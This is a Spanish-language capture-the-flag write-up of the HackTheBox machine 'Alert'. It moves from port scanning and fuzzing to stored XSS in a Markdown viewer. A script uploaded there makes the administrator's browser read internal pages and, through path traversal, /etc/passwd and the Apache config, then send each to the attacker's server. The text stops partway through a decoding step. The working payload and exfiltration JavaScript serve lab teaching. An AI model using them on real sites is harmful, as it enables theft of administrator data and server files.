Propiedades:
- OS: Linux
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #xss #lfi #port-forwarding #csrf 

![](assets/Pasted%20image%2020260101215054.png)
## Reconocimiento

Empiezo Tirando un ping para comprobar la conectividad.

```bash
> ping -c 1 10.129.231.188
PING 10.129.231.188 (10.129.231.188) 56(84) bytes of data.
64 bytes from 10.129.231.188: icmp_seq=1 ttl=63 time=90.8 ms

--- 10.129.231.188 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 90.781/90.781/90.781/0.000 ms
```

Realizo un escaneo con nmap para ver que puertos tenemos abiertos.

```bash\
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.231.188 -oG allPorts
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 63
80/tcp    open     http    syn-ack ttl 63
12227/tcp filtered unknown no-response
```

- Puertos 22 y 80 abiertos.

Sobre los puertos abiertos realizo un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert]
└─$ sudo nmap -p 22,80 -sV -sC -n -Pn -vvv 10.129.231.188 -oN nmap/target

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSrBVJEKTgtUohrzoK9i67CgzqLAxnhEsPmW8hS5CFFGYikUduAcNkKsmmgQI09Q+6pa+7YHsnxcerBnW0taI//IYB5TI/LSE3yUxyk/ROkKLXPNiNGUhC6QiCj3ZTvThyHrFD9ZTxWfZKEQTcOiPs15+HRPCZepPouRtREGwmJcvDal1ix8p/2/C8X57ekouEEpIk1wzDTG5AM2/D08gXXe0TP+KYEaZEzAKM/mQUAqNTxfjc9x5rlfPYW+50kTDwtyKta57tBkkRCnnns0YRnPNtt0AH374ZkYLcqpzxwN8iTNXaeVT/dGfF4mA1uW89hSMarmiRgRh20Y1KIaInHjv9YcvSlbWz+2sz3ev725d4IExQTvDR4sfUAdysIX/q1iNpleyRgM4cvDMjxD6lEKpvQYSWVlRoJwbUUnJqnmZXboRwzRl+V3XCUaABJrA/1K1gvJfsPcU5LX303CV6LDwvLJIcgXlEbtjhkcxz7b7CS78BEW9hPifCUDGKfUs=
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHYLF+puo27gFRX69GBeZJqCeHN3ps2BScsUhKoDV66yEPMOo/Sn588F/wqBnJxsPB3KSFH+kbYW2M6erFI3U5k=
|   256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG/QUl3gapBOWCGEHplsOKe2NlWjlrb5vTTLjg6gMuGl
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://alert.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- Puerto 22 SSH OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
- Puerto 80 HTTP: Apache httpd 2.4.41 con dominio **alert.htb**

Meti el dominio al /etc/hosts.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert]
└─$ cat /etc/hosts

10.129.231.188 alert.htb
```
## Enumeración


### Puerto 80 HTTP

La pagina es un Markdown Viewer, podemos subir y visualizar archivos MarkDown.

![](assets/Pasted%20image%2020260101215744.png)

Subí un `.md` de prueba.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ \cat test.md
# Prueba de archivo test

**Pepe**
```

![](assets/Pasted%20image%2020260101220004.png)

- El boton Share Markdown crea un link con formato: `http://alert.htb/visualizer.php?link_share=695744fe1ad9a7.20695477.md` para poder visualizar el archivo.

Probé subiendo un archivo `html` y también se interpreta correctamente.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ cat htmltest.md
<h1>Hola</h1>

<br>

<p>la web interpreta html</p>
```

![](assets/Pasted%20image%2020260101220546.png)

Probé subiendo un javascript para probar un XSS. Y en efecto se interpreta correctamente. 

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ cat script.md

<script>alert("hola")</script>

```

![](assets/Pasted%20image%2020260101220700.png)


**/about us**

Se nos indica que los administradores revisan nuestros mensajes recurrentemente.

![](assets/Pasted%20image%2020260101223732.png)

Y podemos notar en la URL que el parametro `?page` es quien lista la pagina:

```bash
http://alert.htb/index.php?page=about
```

- Probé con LFI pero nada funciono.

**Fuzzing de Directorios.**

Utilice `ffuf` para descubrir posibles subdominios. 

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://alert.htb/FUZZ/ -c -e .git,.php,.txt,.xml,.js

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://alert.htb/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Extensions       : .git .php .txt .xml .js
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

css                     [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 87ms]
contact.php             [Status: 200, Size: 24, Words: 3, Lines: 2, Duration: 88ms]
uploads                 [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 86ms]
index.php               [Status: 302, Size: 660, Words: 123, Lines: 24, Duration: 87ms]
icons                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 91ms]
messages                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 86ms]
messages.php            [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 87ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 88ms]
```

- **/messages** al acceder a esta ruta mediante **index.php?page=messages** es una pagina en blanco, supongo que son los mensajes por usuario, tal vez el usuario administrador si que tenga mensajes.
- **messages.php** también era un archivo en blanco no note nada raro.

**Fuzzing de Subdominios.**

Podemos notar un subdominio `statistics`, pero obtenemos un `401 Unauthorized`.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://alert.htb/ -H "Host: FUZZ.alert.htb" -ic -fl 10

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://alert.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.alert.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 10
________________________________________________

statistics              [Status: 401, Size: 467, Words: 42, Lines: 15, Duration: 86ms]
```
## Explotación


Se que hay XSS por lo cual me voy a crear un archivo `.md` que intente cargar un script de javascript.

-  Este archivo llamado **exfiltrate.md** va a intentar cargar un archivo **script.js** desde mi servidor.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ cat exfiltrate.md

<script src="http://10.10.15.110/pwn.js"></script>
```

- Ahora voy a crear el archivo **pwn.js** y levantar un servidor con python.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ nano pwn.js
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ sudo python3 -m http.server 80
```

Subí el archivo **exfiltrate.md** y genere un link usando el boton de **Share Markdown.** Este link se lo voy a enviar al administrador diciendole que tengo un problema para ver si el administrador accedo.

![](assets/Pasted%20image%2020260101232234.png)

Podemos ver que el administrador si da clic al link de nuestro documento y se realiza una petición nuestro servidor.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.15.110 - - [01/Jan/2026 23:13:32] "GET /pwn.js HTTP/1.1" 200 -
```

Por lo cual puedo tratar de modificar **script.js** para tratar de leer la pagina de messages, pero del usuario administrador:

- El script va a realizar una request a la ruta de **/index.php?page=messages**, y nos va a mandar todo el codigo fuente de dicha pagina en formato base64.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ cat pwn.js
var req = new XMLHttpRequest()
req.open('GET', 'http://alert.htb/index.php?page=messages', false)
req.send()

var data = new XMLHttpRequest()

data.open('GET', 'http://10.10.15.110/?data=' + btoa(req.responseText), false)
data.send()
```

Subimos denuevo el archivo **exfiltrate.md** y generamos un link de visualización el cual se lo vamos a mandar al administrador.

![](assets/Pasted%20image%2020260101232916.png)

Una vez lo mandamos podemos ver lo siguiente en nuestro servidor:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.15.110 - - [01/Jan/2026 23:27:46] "GET /pwn.js HTTP/1.1" 200 -
10.129.231.188 - - [01/Jan/2026 23:28:08] "GET /pwn.js?data=PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9zdHlsZS5jc3MiPgogICAgPHRpdGxlPkFsZXJ0IC0gTWFya2Rvd24gVmlld2VyPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxuYXY+CiAgICAgICAgPGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9YWxlcnQiPk1hcmtkb3duIFZpZXdlcjwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0IFVzPC9hPgogICAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFib3V0Ij5BYm91dCBVczwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1kb25hdGUiPkRvbmF0ZTwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1tZXNzYWdlcyI+TWVzc2FnZXM8L2E+ICAgIDwvbmF2PgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8aDE+TWVzc2FnZXM8L2gxPjx1bD48bGk+PGEgaHJlZj0nbWVzc2FnZXMucGhwP2ZpbGU9MjAyNC0wMy0xMF8xNS00OC0zNC50eHQnPjIwMjQtMDMtMTBfMTUtNDgtMzQudHh0PC9hPjwvbGk+PC91bD4KICAgIDwvZGl2PgogICAgPGZvb3Rlcj4KICAgICAgICA8cCBzdHlsZT0iY29sb3I6IGJsYWNrOyI+qSAyMDI0IEFsZXJ0LiBBbGwgcmlnaHRzIHJlc2VydmVkLjwvcD4KICAgIDwvZm9vdGVyPgo8L2JvZHk+CjwvaHRtbD4KCg== HTTP/1.1" 200 -
```

Decodificamos todo la data y vemos lo siguiente:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9zdHlsZS5jc3MiPgogICAgPHRpdGxlPkFsZXJ0IC0gTWFya2Rvd24gVmlld2VyPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxuYXY+CiAgICAgICAgPGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9YWxlcnQiPk1hcmtkb3duIFZpZXdlcjwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0IFVzPC9hPgogICAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFib3V0Ij5BYm91dCBVczwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1kb25hdGUiPkRvbmF0ZTwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1tZXNzYWdlcyI+TWVzc2FnZXM8L2E+ICAgIDwvbmF2PgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8aDE+TWVzc2FnZXM8L2gxPjx1bD48bGk+PGEgaHJlZj0nbWVzc2FnZXMucGhwP2ZpbGU9MjAyNC0wMy0xMF8xNS00OC0zNC50eHQnPjIwMjQtMDMtMTBfMTUtNDgtMzQudHh0PC9hPjwvbGk+PC91bD4KICAgIDwvZGl2PgogICAgPGZvb3Rlcj4KICAgICAgICA8cCBzdHlsZT0iY29sb3I6IGJsYWNrOyI+qSAyMDI0IEFsZXJ0LiBBbGwgcmlnaHRzIHJlc2VydmVkLjwvcD4KICAgIDwvZm9vdGVyPgo8L2JvZHk+CjwvaHRtbD4KCg==" | base64 -d; echo
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Alert - Markdown Viewer</title>
</head>
<body>
    <nav>
        <a href="index.php?page=alert">Markdown Viewer</a>
        <a href="index.php?page=contact">Contact Us</a>
        <a href="index.php?page=about">About Us</a>
        <a href="index.php?page=donate">Donate</a>
        <a href="index.php?page=messages">Messages</a>    </nav>
    <div class="container">
        <h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
    </div>
    <footer>
        <p style="color: black;">� 2024 Alert. All rights reserved.</p>
    </footer>
</body>
</html>
```

- Lo importante esta aquí **messages.php?file=2024-03-10_15-48-34.txt**, al parecer el archivo **messages.php** esta listando un archivo a través del parametro **file**.


Voy a modificar el script **pwn.js** para tratar de que el administrador nos liste el `/etc/passwd` a través del archivo **messages.php**.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ cat pwn.js
var req = new XMLHttpRequest()
req.open('GET', 'http://alert.htb/messages.php?file=../../../../../../../../../../../etc/passwd', false)
req.send()

var data = new XMLHttpRequest()

data.open('GET', 'http://10.10.15.110/?data=' + btoa(req.responseText), false)
data.send()
```

Ahora volvemos a subir el archivo `exfiltrate.md` y generamos un link de visualización para enviárselo al administrador.

![](assets/Pasted%20image%2020260101231433.png)

Y a nuestro servidor nos llega:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.15.110 - - [01/Jan/2026 23:33:37] "GET /pwn.js HTTP/1.1" 200 -
10.129.231.188 - - [01/Jan/2026 23:33:53] "GET /?data=PHByZT5yb290Ong6MDowOnJvb3Q6L3Jvb3Q6L2Jpbi9iYXNoCmRhZW1vbjp4OjE6MTpkYWVtb246L3Vzci9zYmluOi91c3Ivc2Jpbi9ub2xvZ2luCmJpbjp4OjI6MjpiaW46L2JpbjovdXNyL3NiaW4vbm9sb2dpbgpzeXM6eDozOjM6c3lzOi9kZXY6L3Vzci9zYmluL25vbG9naW4Kc3luYzp4OjQ6NjU1MzQ6c3luYzovYmluOi9iaW4vc3luYwpnYW1lczp4OjU6NjA6Z2FtZXM6L3Vzci9nYW1lczovdXNyL3NiaW4vbm9sb2dpbgptYW46eDo2OjEyOm1hbjovdmFyL2NhY2hlL21hbjovdXNyL3NiaW4vbm9sb2dpbgpscDp4Ojc6NzpscDovdmFyL3Nwb29sL2xwZDovdXNyL3NiaW4vbm9sb2dpbgptYWlsOng6ODo4Om1haWw6L3Zhci9tYWlsOi91c3Ivc2Jpbi9ub2xvZ2luCm5ld3M6eDo5Ojk6<MAS.............> HTTP/1.1" 200 -
```

Ahora podemos descodificarlo 

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ echo "PHByZT5yb290Ong6MDowOnJvb3Q6L3Jvb3Q6L2Jpbi9iYXNoCmRhZW1vbjp4OjE6MTpkYWVtb246L3Vzci9zYmluOi91c3Ivc2Jpbi9ub2xvZ2luCmJpbjp4OjI6MjpiaW46L2JpbjovdXNyL3NiaW4vbm9sb2dpbgpzeXM6eDozOjM6c3lzOi9kZXY6L3Vzci9zYmluL25vbG9naW4Kc3luYzp4OjQ6NjU1MzQ6c3luYzovYmluOi9iaW4vc3luYwpnYW1lczp4OjU6NjA6Z2FtZXM6L3Vzci9nYW1lczovdXNyL3NiaW4vbm9sb2dpbgptYW46eDo2OjEyOm1hbjovdmFyL2NhY2hlL21hbjovdXNyL3NiaW4vbm9sb2dpbgpscDp4Ojc6NzpscDovdmFyL3Nwb29sL2xwZDovdXNyL3NiaW4vbm9sb2dpbgptYWlsOng6ODo4Om1haWw6L3Zhci9tYWlsOi91c3Ivc2Jpbi9ub2xvZ2luCm5ld3M6eDo5Ojk6bmV3czovdmFyL3Nwb29sL25ld3M6L3Vzci9zYmluL25vbG9naW4KdXVjcDp4OjEwOjEwOnV1Y3A6L3Zhci9zcG9vbC91dWNwOi91c3Ivc2Jpbi9ub2xvZ2luCnByb3h5Ong6MTM6MTM6cHJveHk6L2JpbjovdXNyL3NiaW4vbm9sb2dpbgp3d3ctZGF0YTp4OjMzOjMzOnd3dy1kYXRhOi92YXIvd3d3Oi91c3Ivc2Jpbi9ub2xvZ2luCmJhY2t1cDp4OjM0OjM0OmJhY2t1cDovdmFyL2JhY2t1cHM6L3Vzci9zYmluL25vbG9naW4KbGlzdDp4OjM4OjM4Ok1haWxpbmcgTGlzdCBNYW5hZ2VyOi92YXIvbGlzdDovdXNyL3NiaW4vbm9sb2dpbgppcmM6eDozOTozOTppcmNkOi92YXIvcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1uZXR3b3JrOng6MTAwOjEwMjpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1yZXNvbHZlOng6MTAxOjEwMzpzeXN0ZW1kIFJlc29sdmVyLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTAyOjEwNDpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgptZXNzYWdlYnVzOng6MTAzOjEwNjo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c2xvZzp4OjEwNDoxMTA6Oi9ob21lL3N5c2xvZzovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA1OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KdHNzOng6MTA2OjExMTpUUE0gc29mdHdhcmUgc3RhY2ssLCw6L3Zhci9saWIvdHBtOi9iaW4vZmFsc2UKdXVpZGQ6eDoxMDc6MTEyOjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCnRjcGR1bXA6eDoxMDg6MTEzOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KbGFuZHNjYXBlOng6MTA5OjExNTo6L3Zhci9saWIvbGFuZHNjYXBlOi91c3Ivc2Jpbi9ub2xvZ2luCnBvbGxpbmF0ZTp4OjExMDoxOjovdmFyL2NhY2hlL3BvbGxpbmF0ZTovYmluL2ZhbHNlCmZ3dXBkLXJlZnJlc2g6eDoxMTE6MTE2OmZ3dXBkLXJlZnJlc2ggdXNlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KdXNibXV4Ong6MTEyOjQ2OnVzYm11eCBkYWVtb24sLCw6L3Zhci9saWIvdXNibXV4Oi91c3Ivc2Jpbi9ub2xvZ2luCnNzaGQ6eDoxMTM6NjU1MzQ6Oi9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk5Ojk5OTpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KYWxiZXJ0Ong6MTAwMDoxMDAwOmFsYmVydDovaG9tZS9hbGJlcnQ6L2Jpbi9iYXNoCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCmRhdmlkOng6MTAwMToxMDAyOiwsLDovaG9tZS9kYXZpZDovYmluL2Jhc2gKPC9wcmU+Cg==" | base64 -d; echo
<pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
albert:x:1000:1000:albert:/home/albert:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
david:x:1001:1002:,,,:/home/david:/bin/bash
</pre>
```

Aparte del root vemos 2 usuarios uno llamado albert y otro david.

Anteriormente vimos que habia un subdominio `statistics` por lo cual voy a volver a modificar el archivo **pwn.js** para apuntar a la configuración de vhosts de apache.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ cat pwn.js
var req = new XMLHttpRequest()
req.open('GET', 'http://alert.htb/messages.php?file=../../../../../../../../../../../etc/apache2/sites-available/000-default.conf', false)
req.send()



var data = new XMLHttpRequest()

data.open('GET', 'http://10.10.15.110/?david=' + btoa(req.responseText), false)
data.send()
```

Subo el archivo `exfiltrate.md` y genero un link de visualización para mandárselo al administrador.

- Al momento de mandárselo me llega lo siguiente.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.231.188 - - [01/Jan/2026 23:43:38] "GET /pwn.js HTTP/1.1" 200 -
10.129.231.188 - - [01/Jan/2026 23:43:39] "GET /?david=PHByZT48VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgYWxlcnQuaHRiCgogICAgRG9jdW1lbnRSb290IC92YXIvd3d3L2FsZXJ0Lmh0YgoKICAgIDxEaXJlY3RvcnkgL3Zhci93d3cvYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICBSZXdyaXRlRW5naW5lIE9uCiAgICBSZXdyaXRlQ29uZCAle0hUVFBfSE9TVH0gIV5hbGVydFwuaHRiJAogICAgUmV3cml0ZUNvbmQgJXtIVFRQX0hPU1R9ICFeJAogICAgUmV3cml0ZVJ1bGUgXi8/KC4qKSQgaHR0cDovL2FsZXJ0Lmh0Yi8kMSBbUj0zMDEsTF0KCiAgICBFcnJvckxvZyAke0FQQUNIRV9MT0dfRElSfS9lcnJvci5sb2cKICAgIEN1c3RvbUxvZyAke0FQQUNIRV9MT0dfRElSfS9hY2Nlc3MubG9nIGNvbWJpbmVkCjwvVmlydHVhbEhvc3Q+Cgo8VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICBEb2N1bWVudFJvb3QgL3Zhci93d3cvc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzCiAgICAgICAgQWxsb3dPdmVycmlkZSBBbGwKICAgICAgICBBdXRoVHlwZSBCYXNpYwogICAgICAgIEF1dGhOYW1lICJSZXN0cmljdGVkIEFyZWEiCiAgICAgICAgQXV0aFVzZXJGaWxlIC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiLy5odHBhc3N3ZAogICAgICAgIFJlcXVpcmUgdmFsaWQtdXNlcgogICAgPC9EaXJlY3Rvcnk+CgogICAgRXJyb3JMb2cgJHtBUEFDSEVfTE9HX0RJUn0vZXJyb3IubG9nCiAgICBDdXN0b21Mb2cgJHtBUEFDSEVfTE9HX0RJUn0vYWNjZXNzLmxvZyBjb21iaW5lZAo8L1ZpcnR1YWxIb3N0PgoKPC9wcmU+Cg== HTTP/1.1" 200 -
```

Lo descodifico y podemos ver lo siguiente:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
